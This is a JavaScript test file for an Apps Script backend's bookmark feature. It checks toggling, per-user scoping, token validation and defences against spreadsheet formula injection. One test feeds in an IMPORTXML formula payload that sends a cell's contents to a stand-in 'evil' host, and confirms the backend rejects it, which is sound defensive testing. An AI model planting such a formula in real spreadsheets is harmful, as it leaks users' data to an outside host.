/**
 * Backend tests for the bookmark actions (handleBookmark / handleMyBookmarks).
 *
 * Same eval-the-real-source harness as handlers.test.js: Code.gs runs against
 * in-memory Apps Script stubs, so these exercise the shipped functions.
 * Covers: the toggle contract (insert ↔ delete), the '@'-formatted text write
 * (formula injection), the SEC4 id gate, per-user scoping of myBookmarks, and
 * the bookmark_ids key in the bootstrap batch.
 */
import { describe, it, expect } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const SRC = fs.readFileSync(path.resolve(HERE, '../../../apps-script/Code.gs'), 'utf-8');
const CLIENT_ID = SRC.match(/GOOGLE_CLIENT_ID\s*=\s*'([^']+)'/)[1];
const nowSec = () => Math.floor(Date.now() / 1000);

const BOOKMARK_HEADERS = ['bookmark_id', 'video_id', 'user_email', 'created_at'];

/**
 * An in-memory sheet recording range formats/writes AND row deletions, so the
 * toggle-off path (deleteRow) is assertable alongside the toggle-on write.
 */
function recordingSheet(rows) {
  const grid = rows.map((r) => r.slice());
  const formats = [];
  const writes = [];
  const deleted = [];
  return {
    _grid: grid,
    _formats: formats,
    _writes: writes,
    _deleted: deleted,
    getDataRange: () => ({ getValues: () => grid.map((r) => r.slice()) }),
    getLastRow: () => grid.length,
    getRange: (row, col, numRows, numCols) => ({
      setNumberFormat(fmt) { formats.push({ numCols, fmt }); return this; },
      setValue() { return this; },
      setValues(values) { writes.push({ numCols, values }); return this; },
    }),
    appendRow: (r) => { grid.push(r.slice()); },
    deleteRow: (n) => { deleted.push(n); grid.splice(n - 1, 1); },
  };
}

/** SpreadsheetApp stub: `first` backs getSheets()[0], `named` getSheetByName. */
function spreadsheetApp(first, named = {}) {
  const ss = {
    getSheets: () => [first],
    getSheetByName: (name) => (name in named ? named[name] : null),
    insertSheet: () => first,
  };
  return { openById: () => ss };
}

function memoryCache() {
  const store = new Map();
  const cache = {
    get: (k) => (store.has(k) ? store.get(k) : null),
    put: (k, v) => { store.set(k, v); },
    remove: (k) => { store.delete(k); },
  };
  return { getScriptCache: () => cache };
}

function loadBackend(mocks = {}) {
  const first = mocks.first || recordingSheet([[]]);
  const globals = {
    UrlFetchApp: mocks.UrlFetchApp || { fetch: () => ({ getResponseCode: () => 200, getContentText: () => '{}' }) },
    SpreadsheetApp: mocks.SpreadsheetApp || spreadsheetApp(first, mocks.named || {}),
    LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
    CacheService: memoryCache(),
    Utilities: {
      getUuid: () => '00000000-0000-0000-0000-000000000000',
      computeDigest: () => [], base64EncodeWebSafe: () => 'x', sleep() {},
      DigestAlgorithm: { MD5: 'MD5', SHA_256: 'SHA_256' },
    },
    Logger: { log() {} },
    ContentService: { createTextOutput: () => ({ setMimeType: () => ({}) }), MimeType: { JSON: 'json' } },
    ScriptApp: {}, XmlService: {},
  };
  const names = ['handleBookmark', 'handleMyBookmarks', 'handleBootstrap'];
  const factory = new Function(...Object.keys(globals), `${SRC}\nreturn { ${names.join(', ')} };`);
  return factory(...Object.values(globals));
}

function tokeninfo(payload, code = 200) {
  return { fetch: () => ({ getResponseCode: () => code, getContentText: () => JSON.stringify(payload) }) };
}

const validClaims = () => ({
  aud: CLIENT_ID, iss: 'accounts.google.com', exp: nowSec() + 3600,
  email: 'user@example.com', email_verified: 'true', name: 'User', picture: 'https://x/p.jpg',
});

/** Loads the backend with a Bookmarks tab seeded with `rows` (after headers). */
function setup(rows = []) {
  const bookmarks = recordingSheet([BOOKMARK_HEADERS.slice(), ...rows]);
  // getBookmarksSheet resolves via getSheetByName('Bookmarks'); everything
  // else (Blocked, Meta) falls back to a blank first sheet.
  const first = recordingSheet([[]]);
  const SpreadsheetApp = spreadsheetApp(first, { Bookmarks: bookmarks, Archive: null });
  const be = loadBackend({ SpreadsheetApp, UrlFetchApp: tokeninfo(validClaims()) });
  return { be, bookmarks };
}

describe('handleBookmark (toggle contract)', () => {
  it("first toggle bookmarks: '@'-formatted 4-col write with a b_ id", () => {
    const { be, bookmarks } = setup();
    const res = be.handleBookmark({ videoId: 'dQw4w9WgXcQ', token: 't' });

    expect(res.status).toBe('ok');
    expect(res.bookmarked).toBe(true);

    // Range formatted as text BEFORE values land — no formula execution.
    expect(bookmarks._formats).toEqual([{ numCols: 4, fmt: '@' }]);
    expect(bookmarks._writes.length).toBe(1);
    const row = bookmarks._writes[0].values[0];
    expect(row[0]).toMatch(/^b_/);                 // bookmark_id
    expect(row[1]).toBe('dQw4w9WgXcQ');            // video_id
    expect(row[2]).toBe('user@example.com');       // user_email
  });

  it('second toggle removes the existing row and reports bookmarked:false', () => {
    const { be, bookmarks } = setup([
      ['b_1', 'dQw4w9WgXcQ', 'user@example.com', '2026-01-01T00:00:00Z'],
    ]);
    const res = be.handleBookmark({ videoId: 'dQw4w9WgXcQ', token: 't' });
    expect(res.status).toBe('ok');
    expect(res.bookmarked).toBe(false);
    expect(bookmarks._deleted).toEqual([2]);       // the seeded 1-based row
    expect(bookmarks._writes.length).toBe(0);
  });

  it("never deletes ANOTHER user's bookmark of the same video", () => {
    const { be, bookmarks } = setup([
      ['b_1', 'dQw4w9WgXcQ', 'other@example.com', '2026-01-01T00:00:00Z'],
    ]);
    const res = be.handleBookmark({ videoId: 'dQw4w9WgXcQ', token: 't' });
    expect(res.bookmarked).toBe(true);             // inserted for THIS user
    expect(bookmarks._deleted).toEqual([]);
  });

  it('rejects a formula-shaped videoId before any row is written (SEC4)', () => {
    const { be, bookmarks } = setup();
    const res = be.handleBookmark({ videoId: '=IMPORTXML("https://evil/?d="&C2,"//a")', token: 't' });
    expect(res.status).toBe('error');
    expect(res.message).toMatch(/invalid videoid/i);
    expect(bookmarks._writes.length).toBe(0);
  });

  it('rejects missing fields and an invalid token', () => {
    const { be } = setup();
    expect(be.handleBookmark({ token: 't' }).status).toBe('error');
    expect(be.handleBookmark({ videoId: 'dQw4w9WgXcQ' }).status).toBe('error');

    const bad = loadBackend({
      SpreadsheetApp: spreadsheetApp(recordingSheet([[]]), { Bookmarks: recordingSheet([BOOKMARK_HEADERS.slice()]), Archive: null }),
      UrlFetchApp: tokeninfo({ ...validClaims(), aud: 'attacker' }),
    });
    expect(bad.handleBookmark({ videoId: 'dQw4w9WgXcQ', token: 't' }).status).toBe('error');
  });
});

describe('handleMyBookmarks / bootstrap', () => {
  const seeded = () => setup([
    ['b_1', 'vidA', 'user@example.com', '2026-01-01T00:00:00Z'],
    ['b_2', 'vidB', 'user@example.com', '2026-01-02T00:00:00Z'],
    ['b_3', 'vidC', 'other@example.com', '2026-01-03T00:00:00Z'],
  ]);

  it("returns only the signed-in user's ids, keyed bookmark_ids", () => {
    const { be } = seeded();
    const res = be.handleMyBookmarks({ token: 't' });
    expect(res.status).toBe('ok');
    expect(res.bookmark_ids).toEqual(['vidA', 'vidB']);
  });

  it('rejects a missing token', () => {
    const { be } = seeded();
    expect(be.handleMyBookmarks({}).status).toBe('error');
  });

  it('handleBootstrap includes bookmark_ids alongside votes and stars', () => {
    const { be } = seeded();
    const res = be.handleBootstrap({ token: 't' });
    expect(res.status).toBe('ok');
    expect(res.bookmark_ids).toEqual(['vidA', 'vidB']);
  });
});
